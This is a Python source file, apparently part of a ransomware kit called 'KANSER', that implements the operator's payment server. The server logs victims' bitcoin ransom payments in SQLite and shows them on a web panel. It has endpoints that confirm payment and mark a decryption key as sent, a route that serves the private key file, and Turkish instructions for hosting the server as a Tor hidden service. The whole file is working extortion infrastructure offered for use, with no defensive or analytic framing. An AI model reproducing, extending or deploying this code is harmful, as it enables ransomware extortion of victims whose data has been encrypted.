#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER RANSOMWARE — Tor Payment Server
Odeme takip + Otomatik decrypt key gonderimi
"""
import os, sys, json, time, hashlib, threading, http.server, socketserver, sqlite3

DB_PATH = "payments.db"
PRIVATE_KEY_PATH = "private_key.pem"
PORT = 8080

class PaymentDB:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.conn.execute("CREATE TABLE IF NOT EXISTS payments (id TEXT PRIMARY KEY, ransom_id TEXT, tx_hash TEXT, amount_btc REAL, status TEXT, paid_at TEXT, key_sent INTEGER DEFAULT 0)")
        self.conn.commit()

    def add_payment(self, ransom_id, tx_hash, amount):
        pid = hashlib.sha256(f"{ransom_id}{tx_hash}{time.time()}".encode()).hexdigest()[:12]
        self.conn.execute("INSERT OR REPLACE INTO payments VALUES (?,?,?,?,'pending',datetime('now'),0)", (pid, ransom_id, tx_hash, amount))
        self.conn.commit()
        return pid

    def confirm_payment(self, pid):
        self.conn.execute("UPDATE payments SET status='confirmed' WHERE id=?", (pid,))
        self.conn.commit()
        return self.get_payment(pid)

    def get_payment(self, pid):
        row = self.conn.execute("SELECT * FROM payments WHERE id=?", (pid,)).fetchone()
        if row: return dict(zip(["id", "ransom_id", "tx_hash", "amount_btc", "status", "paid_at", "key_sent"], row))
        return None

    def get_by_ransom_id(self, rid):
        rows = self.conn.execute("SELECT * FROM payments WHERE ransom_id=?", (rid,)).fetchall()
        return [dict(zip(["id", "ransom_id", "tx_hash", "amount_btc", "status", "paid_at", "key_sent"], r)) for r in rows]

    def get_all(self):
        rows = self.conn.execute("SELECT * FROM payments ORDER BY paid_at DESC").fetchall()
        return [dict(zip(["id", "ransom_id", "tx_hash", "amount_btc", "status", "paid_at", "key_sent"], r)) for r in rows]

    def mark_key_sent(self, pid):
        self.conn.execute("UPDATE payments SET key_sent=1 WHERE id=?", (pid,))
        self.conn.commit()

def panel_html(payments):
    rows = ""
    for p in payments:
        color = "#0f0" if p["status"] == "confirmed" else "#ff0" if p["status"] == "pending" else "#f00"
        ks = "[KEY SENT]" if p["key_sent"] else "[WAITING]"
        rows += f'<tr><td>{p["id"]}</td><td>{p["ransom_id"]}</td><td style="color:{color}">{p["status"]}</td><td>{p["amount_btc"]}</td><td>{p["paid_at"]}</td><td>{ks}</td></tr>'

    return f"""<!DOCTYPE html><html><head><title>KANSER RANSOM — Payment Panel</title>
<style>body{{background:#0a0000;color:#fff;font-family:Arial;padding:20px}}
h1{{color:#ff2a2a}}table{{width:100%;border-collapse:collapse;margin-top:20px}}
th{{background:#1a0000;color:#ff2a2a;padding:10px;text-align:left;border-bottom:2px solid #ff2a2a}}
td{{padding:8px;border-bottom:1px solid #333}}tr:hover{{background:#1a0a0a}}
.stats{{display:flex;gap:20px;margin:20px 0}}.stat{{background:#1a0000;padding:20px;border-radius:8px;border:1px solid #ff2a2a;flex:1;text-align:center}}
.stat .num{{font-size:36px;color:#ff2a2a}}.stat .lbl{{font-size:12px;color:#888}}
</style><meta http-equiv="refresh" content="30"></head><body>
<h1>KANSER RANSOMWARE — Payment Panel</h1>
<div class="stats">
<div class="stat"><div class="num">{len([p for p in payments if p["status"]=="confirmed"])}</div><div class="lbl">CONFIRMED</div></div>
<div class="stat"><div class="num">{len([p for p in payments if p["status"]=="pending"])}</div><div class="lbl">PENDING</div></div>
<div class="stat"><div class="num">{len(payments)}</div><div class="lbl">TOTAL</div></div>
</div>
<table><tr><th>ID</th><th>Ransom ID</th><th>Status</th><th>BTC</th><th>Date</th><th>Key</th></tr>{rows}</table>
</body></html>"""

class PaymentHandler(http.server.BaseHTTPRequestHandler):
    db = None

    def do_GET(self):
        if self.path == "/":
            self._serve_html(panel_html(self.db.get_all()))
        elif self.path == "/api/payments":
            self._serve_json(self.db.get_all())
        elif self.path.startswith("/api/payment/"):
            pid = self.path.split("/")[-1]
            p = self.db.get_payment(pid)
            if p: self._serve_json(p)
            else: self._error("Not found", 404)
        elif self.path.startswith("/api/ransom/"):
            rid = self.path.split("/")[-1]
            self._serve_json(self.db.get_by_ransom_id(rid))
        elif self.path == "/key":
            self._serve_file(PRIVATE_KEY_PATH, "application/x-pem-file")
        else:
            self._error("Not found", 404)

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        data = json.loads(self.rfile.read(content_length).decode())
        if self.path == "/api/payment":
            pid = self.db.add_payment(data.get("ransom_id", "?"), data.get("tx_hash", "?"), data.get("amount", 0))
            self._serve_json({"id": pid, "status": "pending"})
        elif self.path.startswith("/api/confirm/"):
            pid = self.path.split("/")[-1]
            p = self.db.confirm_payment(pid)
            if p:
                if os.path.exists(PRIVATE_KEY_PATH):
                    self.db.mark_key_sent(pid)
                    self._serve_json({"status": "confirmed", "key_sent": True})
                else:
                    self._serve_json({"status": "confirmed", "key_sent": False, "error": "Key file not found"})
            else:
                self._error("Payment not found", 404)
        else:
            self._error("Not found", 404)

    def _serve_html(self, html):
        self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers()
        self.wfile.write(html.encode())

    def _serve_json(self, data):
        self.send_response(200); self.send_header("Content-Type", "application/json"); self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def _serve_file(self, path, mime):
        if not os.path.exists(path):
            self._error("Not found", 404); return
        self.send_response(200); self.send_header("Content-Type", mime); self.end_headers()
        with open(path, "rb") as f: self.wfile.write(f.read())

    def _error(self, msg, code):
        self.send_response(code); self.send_header("Content-Type", "application/json"); self.end_headers()
        self.wfile.write(json.dumps({"error": msg}).encode())

    def log_message(self, format, *args): pass

def main():
    db = PaymentDB()
    PaymentHandler.db = db

    print(f"""
==================================
 KANSER RANSOMWARE PAYMENT SERVER
==================================
  Panel: http://localhost:{PORT}
  API:   http://localhost:{PORT}/api/payments
  Key:   http://localhost:{PORT}/key

  Tor kullanmak icin:
  1. Tor Browser indir
  2. torrc dosyasina ekle:
     HiddenServiceDir C:\\tor_service
     HiddenServicePort 80 127.0.0.1:{PORT}
  3. .onion adresin: C:\\tor_service\\hostname
==================================
""")

    server = socketserver.TCPServer(("0.0.0.0", PORT), PaymentHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped")

if __name__ == "__main__":
    main()
